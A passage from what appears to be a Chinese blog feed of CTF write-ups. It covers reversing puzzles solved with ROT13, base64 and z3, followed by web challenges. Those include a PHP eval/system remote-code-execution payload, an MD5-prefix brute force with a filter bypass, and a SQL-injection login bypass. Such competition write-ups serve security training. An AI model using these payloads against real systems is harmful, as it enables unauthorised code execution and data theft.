ttk(str2).compareTo(&quot;</span>Jr_j11y_s1tug_g0_raq_g0_raq_pnml<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (flag == 0 &amp;&amp; str5.toString().compareTo(&quot;</span><span class="number">871019511949491089510249103104116951164895101110100951164895101110100959997122121</span><span class="string">&quot;) == 0) &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is correct!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is wrong!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>flag经 <code>ttk()</code> 函数处理后与 <code>Jr_j11y_s1tug_g0_raq_g0_raq_pnml</code> 相同，逆 <code>ttk()</code> 替换函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += k</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We_w11l_f1ght_t0_end_t0_end_cazy</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</code></p><p>​    </p><h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><blockquote><p>普通的柴犬，戳一戳会发生什么奇妙的事情呢？</p></blockquote><p>将exe用16进制工具查看，根据运行提示文字找到附近存在 <code>ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</code>，base64解码得flag：<code>flag&#123;Ch1na_yyds_cazy&#125;</code>。</p><p>​    </p><h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><blockquote><p>初次见面，送个python题，祝您接下来解题顺利，flag{input}</p></blockquote><p>uncompyle6反编译pyc文件得源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [</span><br><span class="line">     <span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="built_in">list</span>(f)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">            flag[j] = <span class="built_in">ord</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">            t1.start()</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag == Happy:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">f = [BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">flag = f[:]</span><br><span class="line">x = Solver()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [<span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">    t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x.add(flag[k]==Happy[k])</span><br><span class="line">    <span class="keyword">if</span> x.check() == sat:</span><br><span class="line">        m = x.model()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[f[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f))]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># He110_cazy</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;He110_cazy&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>第一层正则表达式为递归匹配只含字母、数字、下划线的无参函数，如 <code>a(b_c());</code>，第二层要求不能包含 <code>session|end|next|header|dir</code> 关键字，使用 <code>get_defined_vars()</code> 可从请求中向 <code>$_GET</code> 传入所需执行的函数，由于 <code>end</code> 和 <code>next</code> 不能使用，可使用 <code>reset</code> 和 <code>array_reverse</code> 调整数组与取值，再利用 <code>eval</code> 命令执行。</p><p>payload：<code>?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2021-公开赛</title>
    <link href="https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2021-12-07T11:44:54.000Z</published>
    <updated>2021-12-07T16:08:16.383Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>为响应国家选拔、推荐优秀网络空间安全专业人才，培养学生的创新意识与团队合作精神，提高大学生的网络安全技术水平、创新实践与综合设计能力，推动我国高校网络空间安全专业建设与改革，全国9所高校（闽南师范大学，福州大学至诚学院，重庆大学，陆军工程大学，南京航空航天大学，金陵科技学院，西华大学，浙江师范大学，厦门理工大学）决定组成联合招新赛，秉着公平，公正，公开的原则为本高校选拔网络空间安全专业人才。</p><p>竞赛时间</p><p>2021年11月28日-2021年12月6日</p><p>竞赛平台</p><p>自研平台，平台地址：<a href="https://ctf.unctf.com/">https://ctf.unctf.com/</a></p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="fuzz-md5"><a href="#fuzz-md5" class="headerlink" title="fuzz_md5"></a>fuzz_md5</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"><span class="variable">$pass2</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass3</span>=substr(<span class="variable">$pass2</span>, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable">$a</span>=preg_replace(<span class="string">&quot;/unctf/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&quot;unctf&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass3</span>===<span class="string">&quot;66666&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><code>user</code> 参数值双写绕过，<code>pass</code> 参数值爆破符合前5位是66666的MD5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    x = md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> x.startswith(<span class="string">&#x27;66666&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1004649</span></span><br></pre></td></tr></table></figure><p>Payload：<code>http://xxx/?user=ununctfctf</code>，POST传参 <code>pass=1004649</code>。</p><p>flag：<code>UNCTF&#123;13875534-9edb-4e2b-b51c-b18091ca1284&#125;</code></p><p>​    </p><h3 id="can-you-hacked-me"><a href="#can-you-hacked-me" class="headerlink" title="can_you_hacked_me"></a>can_you_hacked_me</h3><blockquote><p>带黑阔，你能把我骇咯？</p></blockquote><p><code>www.zip</code> 得到源码。</p><p><code>index.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can You Hacked me?&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Can You Hacked me?&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/&#x27;|union|select|&amp;|\||and|or|\(|,/i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/\&#x27;|union|select|&amp;|\\||and|or|(|,/i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    $username = $_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = $_GET[&#x27;password&#x27;];</span><br><span class="line">    </span><br><span class="line">    waf1($username) || waf1($password);</span><br><span class="line">    </span><br><span class="line">    if (strtolower($_GET[&#x27;username&#x27;]) == &#x27;admin&#x27; &amp;&amp; $_SERVER[&quot;REMOTE_ADDR&quot;] != &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">        die(&#x27;Admin only allow to login at localhost&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $conn = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;select * from `users` where username = &#x27;$username&#x27; and password = &#x27;$password&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    </span><br><span class="line">    echo $sql . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    </span><br><span class="line">    if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">        // 输出数据</span><br><span class="line">        while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">            if($row[&quot;username&quot;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">                echo &#x27;Welcome Admin, here is your flag: &#x27; . $flag;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;You are not Admin.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Result Not Found!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>db.sql</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> supersqli;</span><br><span class="line"></span><br><span class="line">USE supersqli;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `users` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM  <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;AdminSecret&#x27;</span>);</span><br></pre></td></tr></table></figure><p>禁用的关键字使得难以进行常规注入，考虑让where条件恒真，<code>username</code> 传入 <code>\</code> 转义后单引号，使 <code>username</code> 的值为 <code>&#39; and password =</code>，<code>password</code> 传入异或操作，使总条件恒真，再筛选出第二条数据即可让查询结果为 <code>admin</code>。</p><p>Payload：</p><p><code>http://xxx/?username=\&amp;password=^0 limit 2 offset 1 --+</code></p><p>flag：<code>UNCTF&#123;3abc4508-17c4-488e-9b2b-3fa11fee771c&#125;</code></p><p>​    </p><h3 id="phpmysql"><a href="#phpmysql" class="headerlink" title="phpmysql"></a>phpmysql</h3><blockquote><p>你了解flag吗?在根目录哦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;欢迎来到unctf2021，have fun&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_host</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$db_user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$db_pwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$db_port</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db_host</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span 